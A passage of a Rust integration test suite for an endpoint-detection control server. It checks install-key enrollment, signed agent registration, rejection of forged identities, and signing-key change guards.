use axum::{
    body::Body,
    http::{Request, StatusCode},
};
use ed25519_dalek::{Signer, SigningKey, Verifier};
use sha2::Digest;
use sqlx::sqlite::{SqlitePool, SqlitePoolOptions};
use std::collections::BTreeMap;
use std::sync::Arc;
use tower::ServiceExt;
use zedr_control_server::proofs::{ReceiptVerifier, Verified};
use zedr_ledger::{leaf, seal, Hash, WindowHeader, GENESIS};
use zedr_protocol::{
    bytes_to_base64, hash_to_hex, FileAction, FileEvent, InventoryAction, NetworkAction, NetworkEvent, Opening, PackageEvent, PackageManager, PersistenceEvent, PersistenceKind,
    ProcessAction, ProcessEvent, ProofSubmission, Release, SealedEvent, SealedWindow, SealedWindowHeader, SensorEvent, SystemEvent,
};
use zedr_rules::proof::{Committed, Input, Journal, WindowInput, JOURNAL_VERSION};
use zedr_rules::State;

async fn create_test_db() -> SqlitePool {
    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect("sqlite::memory:")
        .await
        .expect("Failed to connect to test database");

    sqlx::migrate!("./migrations")
        .run(&pool)
        .await
        .expect("Failed to run migrations");

    seed_test_accounts(&pool).await;
    pool
}

async fn seed_test_accounts(pool: &SqlitePool) {
    for (id, username, role) in [("user-1", "tester", "admin"), ("user-2", "reader", "user")] {
        sqlx::query("INSERT INTO users (id, username, password_hash, role, created_at) VALUES (?, ?, 'no-password', ?, 0)")
            .bind(id)
            .bind(username)
            .bind(role)
            .execute(pool)
            .await
            .expect("Failed to seed test accounts");
    }
}

const TEST_JWT_SECRET: &str = "test-secret-key-for-testing-purposes-only";
const TEST_SIGNING_KEY_HEX: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";

const TEST_SERVER_URL: &str = "https://localhost:8443";
const TEST_GUEST_IMAGE_ID: &str = "abababababababababababababababababababababababababababababababab";
const AGENT_CODE_BEFORE_KEY_SLOT: &[u8] = b"_agent_code_";

fn agent_template(with_key_slot: bool) -> Vec<u8> {
    let mut template = b"MZ_agent_".to_vec();
    template.extend_from_slice(zedr_control_server::signing::SERVER_URL_PLACEHOLDER);
    template.extend_from_slice(AGENT_CODE_BEFORE_KEY_SLOT);
    if with_key_slot {
        template.extend_from_slice(&zedr_protocol::SIGNING_PUBLIC_KEY_PLACEHOLDER);
    }
    template.extend_from_slice(b"_agent_tail");
    template
}

const TEST_PROVER: &[u8] = b"prover_of_the_linux_x64_agent";

fn test_binaries_dir() -> &'static std::path::Path {
    static DIR: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
    DIR.get_or_init(|| {
        let dir = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join("agent-binaries");
        let current = dir.join("v0.1.0/windows/arm64");
        let predates_key_slot = dir.join("v0.1.0/windows/x64");
        let linux = dir.join("v0.1.0/linux/x64");
        std::fs::create_dir_all(&current).unwrap();
        std::fs::create_dir_all(&predates_key_slot).unwrap();
        std::fs::create_dir_all(&linux).unwrap();
        std::fs::write(current.join("zedr-agent.exe"), agent_template(true)).unwrap();
        std::fs::write(linux.join("zedr-agent"), agent_template(true)).unwrap();
        std::fs::write(linux.join("zedr-prover"), TEST_PROVER).unwrap();
        std::fs::write(predates_key_slot.join("zedr-agent.exe"), agent_template(false)).unwrap();
        dir
    })
}

fn set_test_env() {
    std::env::set_var("JWT_SECRET", TEST_JWT_SECRET);
    std::env::set_var("ZEDR_SERVER_URL", TEST_SERVER_URL);
    std::env::set_var("ZEDR_SIGNING_KEY_HEX", TEST_SIGNING_KEY_HEX);
    std::env::set_var("ZEDR_BINARIES_DIR", test_binaries_dir());
    std::env::set_var("ZEDR_GUEST_IMAGE_IDS", TEST_GUEST_IMAGE_ID);
}

async fn download_agent(app: &axum::Router, platform: &str, install_key: &str) -> (StatusCode, Vec<u8>) {
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri(format!("/api/installers/binaries/{}?key={}", platform, install_key))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    (status, bytes.to_vec())
}

async fn create_test_app() -> axum::Router {
    set_test_env();
    let pool = create_test_db().await;
    zedr_control_server::api::create_router(pool)
}

async fn create_test_app_with_pool() -> (axum::Router, SqlitePool) {
    set_test_env();
    let pool = create_test_db().await;
    (zedr_control_server::api::create_router(pool.clone()), pool)
}

struct TestAgent {
    id: String,
    key: SigningKey,
    session: u64,
    seq: u64,
}

impl TestAgent {
    fn new(id: &str) -> Self {
        Self {
            id: id.to_string(),
            key: SigningKey::generate(&mut rand::rngs::OsRng),
            session: 1,
            seq: 0,
        }
    }

    fn public_key(&self) -> String {
        hex::encode(self.key.verifying_key().to_bytes())
    }

    fn sign(&self, body: &str) -> String {
        hex::encode(self.key.sign(body.as_bytes()).to_bytes())
    }

    fn restart(&mut self) {
        self.session += 1;
        self.seq = 0;
    }

    fn registration(&mut self, enrollment_key: Option<&str>) -> String {
        self.seq += 1;
        let mut body = serde_json::json!({
            "agent_id": self.id,
            "hostname": "test-host",
            "platform": "windows",
            "os_version": "Windows 11",
            "architecture": "aarch64",
            "version": "0.1.0",
            "ip_address": "192.168.1.100",
            "public_key": self.public_key(),
            "session": self.session,
            "seq": self.seq,
        });
        if let Some(key) = enrollment_key {
            body["enrollment_key"] = serde_json::Value::String(key.to_string());
        }
        body.to_string()
    }

    fn batch(&mut self, events: serde_json::Value) -> String {
        self.seq += 1;
        serde_json::json!({
            "agent_id": self.id,
            "session": self.session,
            "seq": self.seq,
            "events": events,
        })
        .to_string()
    }

    fn heartbeat(&mut self) -> String {
        self.batch(serde_json::json!([{ "Heartbeat": { "timestamp": 1640995200 } }]))
    }
}

async fn post_agent(app: &axum::Router, uri: &str, body: String, signature: Option<&str>) -> (StatusCode, serde_json::Value) {
    let mut request = Request::builder()
        .method("POST")
        .uri(uri)
        .header("content-type", "application/json");
    if let Some(signature) = signature {
        request = request.header(zedr_protocol::SIGNATURE_HEADER, signature);
    }

    let response = app
        .clone()
        .oneshot(request.body(Body::from(body)).unwrap())
        .await
        .unwrap();

    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let json = serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null);
    (status, json)
}

async fn send_signed(app: &axum::Router, agent: &TestAgent, uri: &str, body: String) -> (StatusCode, serde_json::Value) {
    let signature = agent.sign(&body);
    post_agent(app, uri, body, Some(&signature)).await
}

async fn insert_install_key(pool: &SqlitePool, plaintext: &str, expires_in_secs: i64) {
    let now = chrono::Utc::now().timestamp();
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, created_at)
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?)"
    )
    .bind(format!("id-{}", plaintext))
    .bind(hex::encode(sha2::Sha256::digest(plaintext.as_bytes())))
    .bind(now + expires_in_secs)
    .bind(now)
    .execute(pool)
    .await
    .unwrap();
}

async fn enroll(app: &axum::Router, pool: &SqlitePool, agent_id: &str) -> TestAgent {
    let mut agent = TestAgent::new(agent_id);
    let key = format!("zedr_key_for_{}", agent_id);
    insert_install_key(pool, &key, 3600).await;
    let body = agent.registration(Some(&key));
    let (status, _) = send_signed(app, &agent, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK, "enrollment of {} must succeed", agent_id);
    agent
}

async fn open_incidents(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
    sqlx::query_scalar("SELECT incident_type FROM incidents WHERE agent_id = ? AND closed_at IS NULL ORDER BY incident_type")
        .bind(agent_id)
        .fetch_all(pool)
        .await
        .unwrap()
}

async fn liveness_state(pool: &SqlitePool, agent_id: &str) -> String {
    sqlx::query_scalar("SELECT liveness_state FROM agents WHERE id = ?")
        .bind(agent_id)
        .fetch_one(pool)
        .await
        .unwrap()
}

fn admin_token(role: &str) -> String {
    let (id, username) = if role == "admin" { ("user-1", "tester") } else { ("user-2", "reader") };
    zedr_control_server::auth::create_jwt(id, username, role, 0, TEST_JWT_SECRET).unwrap()
}

#[tokio::test]
async fn test_health_endpoint_returns_ok() {
    let app = create_test_app().await;

    let response = app
        .oneshot(
            Request::builder()
                .uri("/health")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::OK);

    let body = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();

    assert_eq!(json["status"], "ok");
    assert_eq!(json["version"], env!("CARGO_PKG_VERSION"));
    assert_eq!(json["database"], "connected");
}

#[tokio::test]
async fn test_health_endpoint_verifies_database_connection() {
    let app = create_test_app().await;

    let response = app
        .oneshot(
            Request::builder()
                .uri("/health")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    let body = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
    
    assert_eq!(json["status"], "ok");
    assert_eq!(json["database"], "connected");
}

#[tokio::test]
async fn test_database_wal_mode() {
    // Skip WAL mode test for in-memory database used in tests
    // In-memory databases use 'delete' journal mode, not 'wal'
    let pool = create_test_db().await;
    
    let result: (String,) = sqlx::query_as("PRAGMA journal_mode")
        .fetch_one(&pool)
        .await
        .expect("Failed to check journal mode");
    
    // In-memory database uses 'memory' mode, which is expected for tests  
    assert!(result.0 == "delete" || result.0 == "wal" || result.0 == "memory", 
            "Database journal mode should be 'delete', 'wal' (production), or 'memory' (test): got '{}'", result.0);
}

#[tokio::test]
async fn test_database_schema_exists() {
    let pool = create_test_db().await;

    let agents_table: (i64,) = sqlx::query_as(
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='agents'"
    )
    .fetch_one(&pool)
    .await
    .expect("Failed to check agents table");

    assert_eq!(agents_table.0, 1, "agents table must exist");

    let events_table: (i64,) = sqlx::query_as(
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='events'"
    )
    .fetch_one(&pool)
    .await
    .expect("Failed to check events table");

    assert_eq!(events_table.0, 1, "events table must exist");
}

#[tokio::test]
async fn test_agent_registration() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_registration_key", 3600).await;

    let mut agent = TestAgent::new("test-machine-guid-123");
    let body = agent.registration(Some("zedr_registration_key"));
    let (status, json) = send_signed(&app, &agent, "/api/agents/register", body).await;

    assert_eq!(status, StatusCode::OK);
    assert_eq!(json["agent_id"], "test-machine-guid-123");
    assert!(json["registered_at"].is_number());

    let pinned: Option<String> = sqlx::query_scalar("SELECT public_key FROM agents WHERE id = ?")
        .bind("test-machine-guid-123")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(pinned, Some(agent.public_key()));
}

#[tokio::test]
async fn test_install_key_reuse_prevention() {
    set_test_env();

    let pool = create_test_db().await;
    
    // Create an install key
    let key_id = "test-key-123";
    let key_plaintext = "test-plaintext-key";
    let expires_at = chrono::Utc::now().timestamp() + 3600; // 1 hour from now
    let created_at = chrono::Utc::now().timestamp();
    let mut hasher = sha2::Sha256::new();
    hasher.update(key_plaintext.as_bytes());
    let key_hash = hex::encode(hasher.finalize());
    
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, created_at) 
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?)"
    )
    .bind(key_id)
    .bind(key_hash)
    .bind(expires_at)
    .bind(created_at)
    .execute(&pool)
    .await
    .unwrap();
    
    let app = zedr_control_server::api::create_router(pool.clone());
    
    // First download should work
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    // Debug the response if it's not OK
    if response.status() != StatusCode::OK {
        let status = response.status();
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let body_text = String::from_utf8_lossy(&body);
        panic!("Expected 200 OK, got {}. Response body: {}", status, body_text);
    }
    assert_eq!(response.status(), StatusCode::OK);
    
    // Second download with same key should fail (reuse prevention)
    let response = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_install_key_expiration() {
    set_test_env();
    let pool = create_test_db().await;
    
    // Create an expired install key
    let key_id = "expired-key-123";
    let key_plaintext = "expired-plaintext-key";
    let expires_at = chrono::Utc::now().timestamp() - 3600; // 1 hour ago
    let created_at = chrono::Utc::now().timestamp() - 7200; // 2 hours ago
    let mut hasher = sha2::Sha256::new();
    hasher.update(key_plaintext.as_bytes());
    let key_hash = hex::encode(hasher.finalize());
    
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, created_at) 
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?)"
    )
    .bind(key_id)
    .bind(key_hash)
    .bind(expires_at)
    .bind(created_at)
    .execute(&pool)
    .await
    .unwrap();
    
    let app = zedr_control_server::api::create_router(pool);
    
    let response = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_install_key_revocation() {
    set_test_env();
    let pool = create_test_db().await;
    
    // Create a revoked install key
    let key_id = "revoked-key-123";
    let key_plaintext = "revoked-plaintext-key";
    let expires_at = chrono::Utc::now().timestamp() + 3600;
    let revoked_at = chrono::Utc::now().timestamp();
    
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, revoked_at, created_at) 
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?, ?)"
    )
    .bind(key_id)
    .bind(sha2::Sha256::digest(key_plaintext.as_bytes()).as_slice().iter().map(|b| format!("{:02x}", b)).collect::<String>())
    .bind(expires_at)
    .bind(revoked_at)
    .bind(chrono::Utc::now().timestamp())
    .execute(&pool)
    .await
    .unwrap();
    
    let app = zedr_control_server::api::create_router(pool);
    
    let response = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_invalid_install_key_format() {
    let app = create_test_app().await;
    
    // Test with malformed key
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/windows-arm64?key=invalid-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
    
    // Test with missing key
    let response = app
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/windows-arm64")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_unauthorized_access_blocked() {
    let app = create_test_app().await;
    
    // Test admin endpoints without auth
    let admin_endpoints = vec![
        "/api/admin/agents",
        "/api/admin/events",
        "/api/admin/installers",
        "/api/admin/agents/some-agent/chain",
        "/api/admin/agents/some-agent/windows/0",
        "/api/admin/chain/summary",
        "/api/admin/ruleset",
    ];
    
    for endpoint in admin_endpoints {
        let response = app
            .clone()
            .oneshot(
                Request::builder()
                    .uri(endpoint)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        
        assert_eq!(
            response.status(), 
            StatusCode::UNAUTHORIZED,
            "Endpoint {} should require authentication", 
            endpoint
        );
    }
}

#[tokio::test]
async fn test_event_ingestion_refuses_sensor_events_and_still_accepts_heartbeats() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "test-agent-id").await;
    let stored = |event_type: &'static str| {
        let pool = pool.clone();
        async move {
            sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM events WHERE agent_id = 'test-agent-id' AND event_type = ?")
                .bind(event_type)
                .fetch_one(&pool)
                .await
                .unwrap()
        }
    };

    let sensed = [
        started(1640995200, 1234, 1000, "/usr/bin/test", &["--arg"]),
        connected(1640995200, 1234, 443),
        wrote(1640995200, 1234, "/tmp/out"),
        autostart(InventoryAction::Added, PersistenceKind::Cron, "job", "/etc/cron.d/job", "true", None),
        package(InventoryAction::Present, PackageManager::Dpkg, "openssl", "3.0.13-0ubuntu3", None),
    ];
    for event in sensed {
        let body = agent.batch(serde_json::json!([{ "Heartbeat": { "timestamp": 1640995200 } }, SystemEvent::from(event)]));
        let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);
    }
    for event_type in ["process", "network", "file", "persistence", "package", "heartbeat"] {
        assert_eq!(stored(event_type).await, 0, "nothing of a refused batch is stored, not even its {}", event_type);
    }
    assert!(tables_holding(&pool, "/usr/bin/test").await.is_empty());

    let body = agent.heartbeat();
    let (status, json) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK, "a refused batch does not put the agent out of sequence");
    assert_eq!(json["upgrade"], serde_json::Value::Null);
    assert_eq!(stored("heartbeat").await, 1);
}

#[tokio::test]
async fn test_binary_download_requires_valid_key() {
    let app = create_test_app().await;
    
    // Test download without any key
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/linux-x64")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    // Expect 404 for missing route or 400 for missing required parameter
    assert!(response.status() == StatusCode::NOT_FOUND || response.status() == StatusCode::BAD_REQUEST, 
            "Expected 404 or 400, got {}", response.status());
    
    // Test download with invalid key
    let response = app
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/linux-x64?key=nonexistent-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    // Expect 404 for missing route or 401/400 for invalid key
    assert!(response.status() == StatusCode::NOT_FOUND || 
            response.status() == StatusCode::UNAUTHORIZED ||
            response.status() == StatusCode::BAD_REQUEST, 
            "Expected 404, 401, or 400, got {}", response.status());
}

fn test_deployment_key() -> ed25519_dalek::VerifyingKey {
    let seed: [u8; 32] = hex::decode(TEST_SIGNING_KEY_HEX).unwrap().try_into().unwrap();
    SigningKey::from_bytes(&seed).verifying_key()
}

fn key_slot_of(download: &[u8]) -> [u8; 64] {
    let position = download
        .windows(AGENT_CODE_BEFORE_KEY_SLOT.len())
        .position(|window| window == AGENT_CODE_BEFORE_KEY_SLOT)
        .unwrap()
        + AGENT_CODE_BEFORE_KEY_SLOT.len();
    download[position..position + 64].try_into().unwrap()
}

#[tokio::test]
async fn test_downloaded_agent_carries_and_is_signed_by_the_deployment_key() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_download_key", 3600).await;

    let (status, download) = download_agent(&app, "windows-arm64", "zedr_download_key").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(download.len(), agent_template(true).len() + 64);

    let trusted = zedr_protocol::signing_public_key_from_slot(&key_slot_of(&download)).unwrap();
    assert_eq!(trusted, test_deployment_key().to_bytes());

    let url_slot = &download[b"MZ_agent_".len()..b"MZ_agent_".len() + 64];
    assert_eq!(&url_slot[..TEST_SERVER_URL.len()], TEST_SERVER_URL.as_bytes());
    assert!(url_slot[TEST_SERVER_URL.len()..].iter().all(|byte| *byte == 0));

    let (contents, signature) = download.split_at(download.len() - 64);
    let signature = ed25519_dalek::Signature::from_slice(signature).unwrap();
    let trusted = ed25519_dalek::VerifyingKey::from_bytes(&trusted).unwrap();
    assert!(trusted.verify(contents, &signature).is_ok());

    let mut tampered = contents.to_vec();
    tampered[0] ^= 0x01;
    assert!(trusted.verify(&tampered, &signature).is_err());
}

#[tokio::test]
async fn test_agent_built_without_key_slot_is_not_served() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_old_binary_key", 3600).await;

    let (status, download) = download_agent(&app, "windows-x64", "zedr_old_binary_key").await;
    assert_eq!(status, StatusCode::INTERNAL_SERVER_ERROR);
    assert!(!download.starts_with(b"MZ"));
}

const SIGNING_SEED_A: &str = "1111111111111111111111111111111111111111111111111111111111111111";
const SIGNING_SEED_B: &str = "2222222222222222222222222222222222222222222222222222222222222222";
const SIGNING_SEED_C: &str = "3333333333333333333333333333333333333333333333333333333333333333";

fn signing_service(seed_hex: &str) -> zedr_control_server::signing::SigningService {
    zedr_control_server::signing::SigningService::from_seed_hex(seed_hex).unwrap()
}

fn public_key_hex(seed_hex: &str) -> String {
    hex::encode(signing_service(seed_hex).public_key())
}

async fn start_with_signing_key(
    pool: &SqlitePool,
    seed_hex: &str,
    accepted: Option<&str>,
) -> Result<zedr_control_server::signing_key_guard::Outcome, zedr_control_server::error::AppError> {
    zedr_control_server::signing_key_guard::enforce(pool, &signing_service(seed_hex), accepted).await
}

async fn recorded_signing_key(pool: &SqlitePool) -> String {
    sqlx::query_scalar("SELECT public_key FROM deployment_signing_key WHERE id = 1")
        .fetch_one(pool)
        .await
        .unwrap()
}

#[tokio::test]
async fn test_first_start_records_the_signing_key_and_restarts_keep_it() {
    use zedr_control_server::signing_key_guard::Outcome;
    let (app, pool) = create_test_app_with_pool().await;

    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap(), Outcome::Recorded);
    assert_eq!(recorded_signing_key(&pool).await, public_key_hex(SIGNING_SEED_A));

    enroll(&app, &pool, "steady-agent").await;
    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap(), Outcome::Unchanged);
}

#[tokio::test]
async fn test_changed_signing_key_is_refused_while_agents_are_enrolled() {
    use zedr_control_server::signing_key_guard::{Outcome, ACCEPT_CHANGE_ENV};
    let (app, pool) = create_test_app_with_pool().await;

    start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap();
    enroll(&app, &pool, "stranded-agent").await;

    let err = start_with_signing_key(&pool, SIGNING_SEED_B, None).await.unwrap_err().to_string();
    assert!(err.contains("(1 enrolled)"), "{}", err);
    assert!(err.contains(&public_key_hex(SIGNING_SEED_A)), "{}", err);
    assert!(err.contains(&format!("{}={}", ACCEPT_CHANGE_ENV, public_key_hex(SIGNING_SEED_B))), "{}", err);

    assert_eq!(recorded_signing_key(&pool).await, public_key_hex(SIGNING_SEED_A));
    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap(), Outcome::Unchanged);
}

#[tokio::test]
async fn test_changed_signing_key_is_adopted_when_no_agent_is_enrolled() {
    use zedr_control_server::signing_key_guard::Outcome;
    let (_app, pool) = create_test_app_with_pool().await;

    start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap();
    assert_eq!(
        start_with_signing_key(&pool, SIGNING_SEED_B, None).await.unwrap(),
        Outcome::Changed { enrolled_agents: 0 }
    );
    assert_eq!(recorded_signing_key(&pool).await, public_key_hex(SIGNING_SEED_B));

    let audited: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM audit_log WHERE action = 'signing_key.changed'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(audited, 1);
}

#[tokio::test]
async fn test_accepting_a_changed_signing_key_must_name_the_new_key() {
    use zedr_control_server::signing_key_guard::Outcome;
    let (app, pool) = create_test_app_with_pool().await;
    let key_a = public_key_hex(SIGNING_SEED_A);
    let key_b = public_key_hex(SIGNING_SEED_B);

    start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap();
    enroll(&app, &pool, "reinstalled-agent").await;

    assert!(start_with_signing_key(&pool, SIGNING_SEED_B, Some(&key_a)).await.is_err());
    assert!(start_with_signing_key(&pool, SIGNING_SEED_B, Some("true")).await.is_err());
    assert_eq!(recorded_signing_key(&pool).await, key_a);

    assert_eq!(
        start_with_signing_key(&pool, SIGNING_SEED_B, Some(&key_b)).await.unwrap(),
        Outcome::Changed { enrolled_agents: 1 }
    );
    assert_eq!(recorded_signing_key(&pool).await, key_b);

    let detail: String = sqlx::query_scalar("SELECT detail FROM audit_log WHERE action = 'signing_key.changed'")
        .fetch_one(&pool)
        .await
        .unwrap();
    let detail: serde_json::Value = serde_json::from_str(&detail).unwrap();
    assert_eq!(detail["previous_public_key"], key_a.as_str());
    assert_eq!(detail["public_key"], key_b.as_str());
    assert_eq!(detail["enrolled_agents"], 1);
    assert!(zedr_control_server::audit::first_broken_entry(&pool).await.unwrap().is_none());

    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_B, Some(&key_b)).await.unwrap(), Outcome::Unchanged);
    assert!(start_with_signing_key(&pool, SIGNING_SEED_C, Some(&key_b)).await.is_err());
}

#[tokio::test]
async fn test_registration_without_signature_rejected() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_unsigned_key", 3600).await;

    let mut agent = TestAgent::new("unsigned-agent");
    let body = agent.registration(Some("zedr_unsigned_key"));
    let (status, _) = post_agent(&app, "/api/agents/register", body, None).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_registration_signed_by_other_key_rejected() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_forged_key", 3600).await;

    let mut agent = TestAgent::new("forged-agent");
    let impostor = TestAgent::new("forged-agent");
    let body = agent.registration(Some("zedr_forged_key"));
    let (status, _) = send_signed(&app, &impostor, "/api/agents/register", body).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_new_agent_without_enrollment_key_rejected() {
    let (app, pool) = create_test_app_with_pool().await;

    let mut agent = TestAgent::new("uninvited-agent");
    let body = agent.registration(None);
    let (status, _) = send_signed(&app, &agent, "/api/agents/register", body).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 0);
}

#[tokio::test]
async fn test_enrollment_key_enrolls_exactly_one_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_single_use", 3600).await;

    let mut first = TestAgent::new("first-agent");
    let body = first.registration(Some("zedr_single_use"));
    let (status, _) = send_signed(&app, &first, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK);

    let mut second = TestAgent::new("second-agent");
    let body = second.registration(Some("zedr_single_use"));
    let (status, _) = send_signed(&app, &second, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let rejected: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE event_type = 'enrollment_rejected'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(rejected, 1);

    let linked: String = sqlx::query_scalar("SELECT enrolled_agent_id FROM install_keys WHERE id = 'id-zedr_single_use'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(linked, "first-agent");
}

#[tokio::test]
async fn test_expired_and_revoked_keys_cannot_enroll() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_expired", -10).await;
    insert_install_key(&pool, "zedr_revoked", 3600).await;
    sqlx::query("UPDATE install_keys SET revoked_at = 1 WHERE id = 'id-zedr_revoked'")
        .execute(&pool)
        .await
        .unwrap();

    for key in ["zedr_expired", "zedr_revoked", "zedr_never_issued"] {
        let mut agent = TestAgent::new(&format!("agent-{}", key));
        let body = agent.registration(Some(key));
        let (status, _) = send_signed(&app, &agent, "/api/agents/register", body).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "{} must not enroll", key);
    }
}

#[tokio::test]
async fn test_known_agent_reregisters_with_pinned_key_only() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "returning-agent").await;

    agent.restart();
    let body = agent.registration(None);
    let (status, _) = send_signed(&app, &agent, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn test_key_change_without_enrollment_opens_identity_conflict() {
    let (app, pool) = create_test_app_with_pool().await;
    let agent = enroll(&app, &pool, "contested-agent").await;

    let mut impostor = TestAgent::new("contested-agent");
    let body = impostor.registration(None);
    let (status, _) = send_signed(&app, &impostor, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    assert_eq!(open_incidents(&pool, "contested-agent").await, vec!["identity_conflict"]);
    let pinned: Option<String> = sqlx::query_scalar("SELECT public_key FROM agents WHERE id = 'contested-agent'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(pinned, Some(agent.public_key()));
}

#[tokio::test]
async fn test_reinstall_with_new_enrollment_key_rotates_identity() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut old_identity = enroll(&app, &pool, "reinstalled-agent").await;

    insert_install_key(&pool, "zedr_reinstall", 3600).await;
    let mut new_identity = TestAgent::new("reinstalled-agent");
    let body = new_identity.registration(Some("zedr_reinstall"));
    let (status, _) = send_signed(&app, &new_identity, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK);

    let body = new_identity.heartbeat();
    let (status, _) = send_signed(&app, &new_identity, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let body = old_identity.heartbeat();
    let (status, _) = send_signed(&app, &old_identity, "/api/events", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let rotations: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM events WHERE agent_id = 'reinstalled-agent' AND event_type = 'identity_rotated'"
    )
    .fetch_one(&pool)
    .await
    .unwrap();
